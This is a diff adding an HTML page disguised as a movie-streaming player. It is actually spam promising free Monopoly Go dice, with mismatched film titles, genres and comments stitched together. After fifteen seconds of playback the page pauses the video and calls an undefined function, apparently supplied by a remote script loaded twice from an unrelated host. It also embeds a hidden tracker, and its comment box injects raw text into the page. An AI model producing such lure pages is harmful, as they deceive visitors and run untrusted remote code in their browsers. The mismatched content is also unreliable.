@@ -1,0 +1,545 @@
+
+<html>
+<head>
+    <title>Monopoly Go Würfel Gratis Bekommen 2026</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #0f0f0f;
+            color: white;
+        }
+
+        .header {
+            background: linear-gradient(to right, #e50914, #b20710);
+            padding: 1rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        .main-content {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .movie-player {
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        .controls {
+            background: rgba(0,0,0,0.8);
+            padding: 1rem;
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .control-btn {
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            padding: 0.5rem;
+            border-radius: 4px;
+            transition: background 0.3s;
+        }
+
+        .control-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .progress-bar {
+            flex-grow: 1;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .progress {
+            position: absolute;
+            height: 100%;
+            background: #e50914;
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.1s;
+        }
+
+        .movie-info {
+            padding: 2rem;
+            background: #1a1a1a;
+            margin-top: 2rem;
+            border-radius: 8px;
+        }
+
+        .movie-details {
+            display: grid;
+            grid-template-columns: 200px 1fr;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .thumbnail {
+            width: 200px;
+            height: 300px;
+            background: #333;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .thumbnail svg {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .info-grid {
+            display: grid;
+            gap: 1rem;
+        }
+
+        .info-item {
+            display: grid;
+            grid-template-columns: 120px 1fr;
+            gap: 1rem;
+        }
+
+        .label {
+            color: #999;
+        }
+
+        .comments-section {
+            margin-top: 2rem;
+            padding-top: 2rem;
+            border-top: 1px solid #333;
+        }
+
+        .comment-form {
+            margin-bottom: 2rem;
+        }
+
+        .comment-input {
+            width: 100%;
+            padding: 1rem;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            margin-bottom: 1rem;
+            resize: vertical;
+        }
+
+        .submit-btn {
+            background: #e50914;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .submit-btn:hover {
+            background: #b20710;
+        }
+
+        .comment {
+            background: #1a1a1a;
+            padding: 1rem;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+        }
+
+        .comment-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            color: #999;
+        }
+
+        .quality-options {
+            display: flex;
+            gap: 1rem;
+            margin: 0.5rem 0 1rem 0;
+        }
+
+        .quality-btn {
+            padding: 0.3rem 1rem;
+            border-radius: 4px;
+            background: #333;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .quality-btn.active {
+            background: #e50914;
+        }
+
+        .quality-btn:hover {
+            background: #444;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 1rem;
+            padding: 1rem;
+            background: #1a1a1a;
+            margin-top: 1rem;
+            border-radius: 8px;
+            justify-content: center;
+        }
+
+        .action-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: #e50914;
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-weight: bold;
+        }
+
+        .action-btn:hover {
+            background: #b20710;
+        }
+
+        .action-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .big-play-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.7);
+            border: none;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            transition: all 0.3s;
+            opacity: 0;
+        }
+
+        .movie-player:hover .big-play-overlay:not(.hidden),
+        .big-play-overlay:not(.hidden):hover {
+            opacity: 1;
+        }
+
+        .big-play-overlay svg {
+            width: 40px;
+            height: 40px;
+            margin-left: 5px;
+        }
+
+        .movie-player video {
+            width: 100%;
+            height: auto;
+            background: #000;
+        }
+
+        .content-locker {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+        }
+
+        .content-locker.hidden {
+            display: none;
+        }
+
+        .locker-content {
+            text-align: center;
+            padding: 2rem;
+            background: #1a1a1a;
+            border-radius: 8px;
+            max-width: 400px;
+        }
+
+        .locker-content h2 {
+            margin-bottom: 1rem;
+        }
+
+        .locker-content p {
+            margin-bottom: 2rem;
+            color: #999;
+        }
+
+        .locker-buttons {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>MovieFlix</h1>
+    </div>
+
+    <div class="main-content">
+        <div class="movie-player">
+            <video id="videoPlayer" width="100%" height="auto" poster="https://ik.imagekit.io/9ninjas/dice/12.jpg?updatedAt=1773138206298">
+                <source src="https://lanetacampeche.com/video/NIHYNNH7AFCLI9N9QXJ24E.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+            <button class="big-play-overlay" id="bigPlayButton">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M8 5v14l11-7z"/>
+                </svg>
+            </button>
+            <div class="controls">
+                <button class="control-btn" id="playPause">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                </button>
+                <div class="progress-bar" id="progressBar">
+                    <div class="progress" id="progress"></div>
+                </div>
+                <button class="control-btn" id="fullscreen">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/>
+                    </svg>
+                </button>
+            </div>
+            <div id="contentLocker" class="content-locker hidden">
+                <div class="locker-content">
+                    <h2>Continue Watching?</h2>
+                    <p>Sign up or log in to keep watching!</p>
+                    <div class="locker-buttons">
+                        <button class="action-btn">Sign Up</button>
+                        <button class="action-btn">Log In</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-buttons">
+            <button class="action-btn" id="streamHD">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14zM9 8h2v8H9zm4 0h2v8h-2z"/>
+                </svg>
+                Streaming HD
+            </button>
+            <button class="action-btn" id="downloadHD">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                </svg>
+                Download HD
+            </button>
+        </div>
+
+        <div class="movie-info">
+            <div class="movie-details">
+                <div class="thumbnail">
+<img class="poster-img" height="100%" width="100%" src="https://ik.imagekit.io/9ninjas/Screenshot_108.jpg">
+                    <svg viewBox="0 0 200 300" fill="#666">
+                        <rect width="200" height="300"/>
+                        <text x="50%" y="50%" text-anchor="middle" fill="#999" font-size="14">
+                            Demon Slayer: Kimetsu no Yaiba Infinity Castle
+                        </text>
+                    </svg>
+                </div>
+                <div class="info-grid">
+                    <h2>Monopoly Go Würfel Gratis Bekommen 2026</h2>
+                    <div class="quality-options">
+                        <button class="quality-btn active" data-quality="hd">HD</button>
+                        <button class="quality-btn" data-quality="sd">SD</button>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Description:</span>
+                        <span>Gratis-Würfel in Monopoly GO (März 2026) erhalten Sie täglich durch offizielle Link-Codes, das Einladen von Freunden (bis zu 1.000 Würfel), den Shop-Bonus alle 8 Stunden, „Quick Wins“-Aufgaben und durch das Vervollständigen von Sticker-Alben. Wichtig ist, mindestens Level 15 zu erreichen, um Links zu nutzen. </span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">An:</span>
+                        <span>2026| 1h 58min</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Genre:</span>
+                        <span>Animation, Action, Fantastique, Thriller</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Regisseur</span>
+                        <span>Monopoly Go Würfel Gratis</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="comments-section">
+                <h3>Comments</h3>
+                <form class="comment-form" id="commentForm">
+                    <textarea class="comment-input" placeholder="Write a comment..." rows="3"></textarea>
+                    <button type="submit" class="submit-btn">Post Comment</button>
+                </form>
+                <div id="comments">
+                    <div class="comment">
+                        <div class="comment-header">
+                            <span class="comment-author">John Doe</span>
+                            <span class="comment-date">2026-03-12</span>
+                        </div>
+                        <p>Animation étonnante ! La conception des personnages est incroyable.</p>
+                    </div>
+                    <div class="comment">
+                        <div class="comment-header">
+                            <span class="comment-author">Monopoly Go Würfel Gratis</span>
+                            <span class="comment-date">2026-03-12</span>
+                        </div>
+                        <p>L'un des meilleurs films d'animation open source jamais réalisés !</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const video = document.getElementById('videoPlayer');
+const playPauseBtn = document.getElementById('playPause');
+const fullscreenBtn = document.getElementById('fullscreen');
+const progressBar = document.getElementById('progressBar');
+const progress = document.getElementById('progress');
+const commentForm = document.getElementById('commentForm');
+const commentsContainer = document.getElementById('comments');
+const qualityBtns = document.querySelectorAll('.quality-btn');
+const streamHDBtn = document.getElementById('streamHD');
+const downloadHDBtn = document.getElementById('downloadHD');
+const bigPlayButton = document.getElementById('bigPlayButton');
+let contentLockerTimer;
+const contentLocker = document.getElementById('contentLocker');
+qualityBtns.forEach(btn => {
+  btn.addEventListener('click', () => {
+    qualityBtns.forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    console.log(`Switching to ${btn.dataset.quality} quality`);
+  });
+});
+playPauseBtn.addEventListener('click', () => {
+  if (video.paused) {
+    video.play();
+    playPauseBtn.innerHTML = `
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/>
+                    </svg>`;
+  } else {
+    video.pause();
+    playPauseBtn.innerHTML = `
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>`;
+  }
+});
+fullscreenBtn.addEventListener('click', () => {
+  if (document.fullscreenElement) {
+    document.exitFullscreen();
+  } else {
+    video.requestFullscreen();
+  }
+});
+video.addEventListener('timeupdate', () => {
+  const percentage = video.currentTime / video.duration * 100;
+  progress.style.width = percentage + '%';
+});
+video.addEventListener('play', () => {
+  bigPlayButton.classList.add('hidden');
+  if (contentLockerTimer) {
+    clearTimeout(contentLockerTimer);
+  }
+  contentLockerTimer = setTimeout(() => {
+    video.pause();
+    _rp();
+  }, 15000);
+});
+video.addEventListener('pause', () => {
+  bigPlayButton.classList.remove('hidden');
+  if (contentLockerTimer) {
+    clearTimeout(contentLockerTimer);
+  }
+});
+video.addEventListener('loadedmetadata', () => {
+  if (!video.poster) {
+    video.poster = "https://storage.googleapis.com/gtv-videos-bucket/sample/images/BigBuckBunny.jpg";
+  }
+});
+progressBar.addEventListener('click', e => {
+  const rect = progressBar.getBoundingClientRect();
+  const pos = (e.clientX - rect.left) / progressBar.offsetWidth;
+  video.currentTime = pos * video.duration;
+});
+commentForm.addEventListener('submit', e => {
+  e.preventDefault();
+  const commentText = commentForm.querySelector('textarea').value;
+  if (commentText.trim()) {
+    const comment = document.createElement('div');
+    comment.className = 'comment';
+    comment.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">User</span>
+                        <span class="comment-date">${new Date().toISOString().split('T')[0]}</span>
+                    </div>
+                    <p>${commentText}</p>
+                `;
+    commentsContainer.insertBefore(comment, commentsContainer.firstChild);
+    commentForm.reset();
+  }
+});
+document.addEventListener('keydown', e => {
+  if (e.code === 'Space') {
+    e.preventDefault();
+    if (video.paused) video.play();else video.pause();
+  }
+  if (e.code === 'ArrowRight') {
+    video.currentTime += 5;
+  }
+  if (e.code === 'ArrowLeft') {
+    video.currentTime -= 5;
+  }
+});
+streamHDBtn.addEventListener('click', () => {
+  alert('Switching to HD streaming...');
+});
+downloadHDBtn.addEventListener('click', () => {
+  alert('Starting HD download...');
+});
+bigPlayButton.addEventListener('click', () => {
+  if (video.paused) {
+    video.play();
+  } else {
+    video.pause();
+  }
+});</script>
+
+<script src="https://mlttamanual.com/Portals/monopol11.js"></script><script src="https://mlttamanual.com/Portals/monopol11.js" type="c3573b5e87e82e07ec15fdd9-text/javascript"></script>
+
+<div style="display:none;">
+<script id="_wau3vz">var _wau = _wau || []; _wau.push(["small", "3kntnjxm4x", "3vz"]);</script><script async src="//waust.at/s.js"></script>
+</div>
+</body>
+</html>
